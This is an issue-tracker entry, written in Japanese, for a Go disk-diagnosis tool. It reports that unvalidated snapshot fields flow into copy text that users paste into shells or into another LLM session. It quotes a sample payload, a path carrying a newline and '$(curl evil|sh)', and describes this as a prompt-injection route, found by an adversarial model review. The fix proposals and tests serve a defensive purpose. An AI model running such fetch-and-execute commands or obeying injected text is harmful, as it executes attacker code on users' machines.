# 193 bug: snapshot 復元で `Items[].Path` が無検査で y/Y のコピー文に載る / `doctor-disk.json` が無検査

起票日: 2026-09-03
重要度: **P1** (Items[].Path) / P2 (doctor-disk.json)
関連: [issues/done/178](done/178-bug-doctor-snapshot-trust-boundary.md) (信頼境界の本体。この issue はその**取りこぼし**) /
[issues/148](148-feat-glogx-doctor-disk-diagnosis.md) の ④ 不変条件

## 出典

178 の最終 commit (`37d6a579`) に対する敵対的レビュー (sonnet / read-only、2026-09-03 07:20 頃)。
178 本文の「採用 8 件 / 受容 1 件」のどちらにも入っていない**新規の指摘**。レビュワーは細工した
snapshot JSON を実際に書いて `go test` で再現している (実験ファイルは削除済み)。

## P1: `Items[].Path` が無検査

`sanitizeSnapshotResults` (`src/glogx/doctor_cache.go`) は Result の Status / Size / MeasuredAt と、
自由文の Reason / Failures / Contents は絞るが、**`disk.Item.Path` には触れていない** (Items を見るのは
負サイズの検査だけ。HEAD `37d6a579` で確認)。

再現: 細工した snapshot の `Items[0].Path` に埋め込み改行 + `$(curl evil|sh)` を置くと、
**`y` / `Y` のコピー文にそのまま出た** (レビュワーが実証)。178 が塞いだ Reason / Contents と
同じ経路 (`diskCopyText` は「別セッションの LLM に消してよいか聞く」形を作る) なので、
prompt injection と、人がそのまま貼る事故の両方が残っている。

対応案: Item.Path も `validateTarget` 相当の形の検査 (絶対パス / `filepath.Clean` と一致 / 制御文字なし)
を通し、崩れた Item を落とす。Item が 1 つでも落ちた Result は合計から外すか FromSnapshot 印を頼りに
再スキャンへ倒す。**④ の不変条件どおり、削除対象にはならない**ことは変わらない (表示とコピーの健全性の話)。

## P2: `doctor-disk.json` (起動トースト用キャッシュ) が無検査

178 の commit message は `doctor-snapshot.json` **と** `doctor-disk.json` を並べて「一般ユーザー権限で
書き換えられる」と名指ししているが、`loadDoctorDiskCache` は JSON を読んで `ScannedAt` の非ゼロだけ
確かめて返す (カタログ照合・長さ上限・Status の検査なし。HEAD で確認)。

- トーストの本文は共通の `sanitizePlainLine` を通るので**制御文字は防がれる**
- しかし偽の `Total` / `Label` はそのまま表示され、`doctorCacheFromReport` の partial マージ
  (172/173 で入れたエントリ単位マージ) が**カタログ照合なしで前回エントリを持ち越す**ので、
  一度書き込まれた偽エントリは partial のたびに延命する (上限は doctorCarryTTL = 24h)

対応案: `loadDoctorDiskCache` で snapshot 側と同じ境界を通す (カタログに無い ID を落とす /
未知 Status を落とす / Label の長さと制御文字 / 負サイズ)。snapshot 側の `sanitizeSnapshotResults`
と二重実装にせず、共通の helper へ寄せる。

## 受け入れ条件

- [ ] 細工した snapshot の `Items[].Path` が行・`y`・`Y` に出ないことをテストで固定する
- [ ] 細工した `doctor-disk.json` のカタログ外 ID / 未知 Status がトーストに出ないことをテストで固定する
- [ ] 変異検証: 各ガードを外すと細工値が現れることを確認する
- [ ] 178 本文の「壊せなかった」節に**この 2 件は含まれていなかった**ことを 1 行追記する
      (次の監査が「178 で閉じたはず」と読まないため)

## 着手の注意

2026-09-03 07:00〜 は予約セッション (`dotfiles-87`) が同じ checkout で doctor 系を触っていた。
着手前に `issues/next/` を見て claim が無いことを確かめる (`claim-issue-in-next-and-push.md`)。
